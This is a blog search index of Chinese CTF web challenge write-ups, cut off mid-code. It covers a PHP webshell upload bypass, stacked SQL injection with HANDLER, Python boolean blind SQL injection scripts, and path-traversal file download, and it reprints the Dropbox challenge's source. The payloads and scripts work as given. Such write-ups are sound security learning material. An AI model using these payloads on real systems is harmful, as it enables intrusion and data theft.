<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BabyUpload</title>
    <url>/2022/02/01/BabyUpload/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>名字一看就知道是文件上传</p>
<p>老样子先随便传一些文件进去看看</p>
<p><img src="/2022/02/01/BabyUpload/1.png" alt="1"></p>
<p>传入php一句话木马发现不能有ph后缀</p>
<p>那么试试别的</p>
<p><img src="/2022/02/01/BabyUpload/2.png" alt="1"></p>
<p><img src="/2022/02/01/BabyUpload/3.png" alt="1"></p>
<p>发现jpg可以传</p>
<p>那么就是htaccess改后缀了</p>
<p>抓个包，上传个一句话木马</p>
<p><img src="/2022/02/01/BabyUpload/4.png" alt="1"></p>
<p>发现他还是被拦截了</p>
<p>因为之前jpg可以上传。那么可以猜测他拦截的是文件的内容</p>
<p>测试了一下发现‘&lt;?’不能在文件里面</p>
<p>卡在这里了</p>
<p>上网查了一下，学到了</p>
<p>可以用$_REQUEST方式传入数据查询</p>
<p><img src="/2022/02/01/BabyUpload/6.png" alt="1"></p>
<p>用html自带的script闭合中间语言用php标识把中间的语句用变成php代码，然后我门可以在下面的用post传参直接命令执行</p>
<p>试一下phpinfo</p>
<p><img src="/2022/02/01/BabyUpload/7.png" alt="1"></p>
<p>但是system好像不能用</p>
<p>我们可以show_source()来读文件</p>
<p>直接构造payload：shell=show_source(“/flag”)</p>
]]></content>
      <tags>
        <tag>GXYCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Blacklist</title>
    <url>/2022/01/30/Blacklist/</url>
    <content><![CDATA[<h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>[可以先看看之前强网杯的随便住]</p>
<p>首先进入题目：</p>
<p><img src="/2022/01/30/Blacklist/1.png" alt="1"></p>
<p>看起来是sql注入先试试看看有啥报错</p>
<p><img src="/2022/01/30/Blacklist/2.png" alt="1"></p>
<p>看起来是单引号字符型漏洞</p>
<p>测试一下他的列数</p>
<p><img src="/2022/01/30/Blacklist/3.png" alt="1"></p>
<p>4看起来不行</p>
<p>测试了一下2的时候可以正常回显</p>
<p><img src="/2022/01/30/Blacklist/4.png" alt="1"></p>
<p>所以列数是2，用select看看有没有回显的地方</p>
<p><img src="/2022/01/30/Blacklist/5.png" alt="1"></p>
<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
<p>但是没有过滤show所以考虑到堆叠注入</p>
<p>看一看库</p>
<p><img src="/2022/01/30/Blacklist/6.png" alt="1"></p>
<p>表：</p>
<p><img src="/2022/01/30/Blacklist/7.png" alt="1"></p>
<p>再看看FlagHere的字段：</p>
<p><img src="/2022/01/30/Blacklist/8.png" alt="1"></p>
<p>还有words字段</p>
<p><img src="/2022/01/30/Blacklist/9.png" alt="1"></p>
<p>可以看到我们的回显就是再words表里面返回的</p>
<p>就想到我们是不是可以更改表名让显示的表是flaghere这张表</p>
<p>但是上面的rename还有alterupdate啥的都被过滤了</p>
<p>被卡住了</p>
<p>上网查了一下知道这样一个骚姿势：（参考网址：<a class="link" href="https://www.cnblogs.com/gaonuoqi/p/12398554.html%EF%BC%89">https://www.cnblogs.com/gaonuoqi/p/12398554.html）<i class="fas fa-external-link-alt"></i></a></p>
<p>handler函数</p>
<p>handleropen可以打开这个表再close之前都可以改变，那我们就可以直接把flaghere这个表第一个读取</p>
<p>就可以替换掉words</p>
<p><img src="/2022/01/30/Blacklist/10.png" alt="1"></p>
<p>payload=?inject=1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>(CISCN2019 华北赛区 Day2 Web1)Hack World</title>
    <url>/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/</url>
    <content><![CDATA[<h1 id="今天来写一下Hack-World"><a href="#今天来写一下Hack-World" class="headerlink" title="今天来写一下Hack World"></a>今天来写一下Hack World</h1><p>首先还是先进入题目：</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/2.png" alt="1"></p>
<p>提示我们我们想要的flag再表flag中的flag列中</p>
<p>我们可以猜一下payload=select flag from flag</p>
<p>先试试输入数字看看</p>
<p>发现1是</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/1.png" alt="1"></p>
<p>2是<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/3.png" alt="1"></p>
<p>0和3就报错了</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/4.png" alt="1"></p>
<p>输入数字看一下<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/5.png" alt="1"></p>
<p>返回了一个布尔值</p>
<p>那试试布尔盲注判断它是否返回了正常值</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/6.png" alt="1"></p>
<p>发现可以正常返回确定了是布尔盲注</p>
<p>写个脚本看看结果database是啥</p>
<p>附python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>看到当前的表名字是ctftraining</p>
<p>想到我们刚刚的select flag from flag</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/7.png" alt="1"></p>
<p>会不会是空格被注释掉了，因为这些函数是可以使用的，尝试一下绕过这个空格</p>
<p>怎么绕呢，看到前面括号可以正常执行</p>
<p>试试括号绕过也就是select(flag)from(flag)</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/8.png" alt="1"></p>
<p>可以运行</p>
<p>那就好办了因为前面说了</p>
<p>flag就在这里面</p>
<p>所以我们直接构造payload打</p>
<p>附上payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就可以拿到flag拉</p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>Dropbox</title>
    <url>/2022/02/28/Dropbox/</url>
    <content><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>进入页面是一个登录框</p>
<p>先注册一下</p>
<p><img src="/2022/02/28/Dropbox/1.png" alt="1"></p>
<p>直接注册admin</p>
<p>发现成功，admin没有注册可能漏洞在别的地方</p>
<p><img src="/2022/02/28/Dropbox/2.png" alt="1"></p>
<p>随便写一些上传</p>
<p><img src="/2022/02/28/Dropbox/3.png" alt="1"></p>
<p>可以发现只可以上传gif等图片格式</p>
<p><img src="/2022/02/28/Dropbox/4.png" alt="1"></p>
<p>然后又发现了两个页面：delete、download</p>
<p>删除没什么用，但是这个下载，可能藏着漏洞</p>
<p>抓个包看一下</p>
<p><img src="/2022/02/28/Dropbox/5.png" alt="1"></p>
<p>可以看到我们刚刚上传的1.png可以下载，看看能不能下载别的东西，猜测一下index文件应该在下载文件的上上层的目录里面，那么就构造../../index.php</p>
<p><img src="/2022/02/28/Dropbox/6.png" alt="1"></p>
<p>可以看到存在任意文件下载漏洞，我们可以把文件下载下来看一看，测试了一下download、delete、index、register、login页面都可以正常下载</p>
<p>但是flag是下载不了的，应该是过滤了flag字符啥的，那么我们来分析一下代码</p>
<p>register.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123; <span class="comment">#如果新注册了一个用户，那么她会重新实例一个User对象，并且将账户信息传递给他</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; strlen(<span class="variable">$username</span>) &gt; <span class="number">2</span> &amp;&amp; strlen(<span class="variable">$password</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$u</span>-&gt;add_user(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;				<span class="comment">#对创建的文件名还有密码进行过滤</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;login.php?register&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;此用户名已被使用&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;请输入有效用户名和密码&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#如果已经登录，那么进行下面的内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;<span class="comment">#包含了class.php中的内容</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);<span class="comment">#新创建一个FileList对象</span></span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中包含了一个class、login页面，一起跟进一下</p>
<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;注册成功&#x27;, &#x27;info&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; <span class="variable">$u</span>-&gt;verify_user(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = htmlentities(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="string">&quot;uploads/&quot;</span> . sha1(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] = <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;账号或密码错误&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，在上面三个页面中，都会进行一个判定是否已经登录，还有注册，注册时候的判定等，这里好像没什么漏洞可以利用</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span 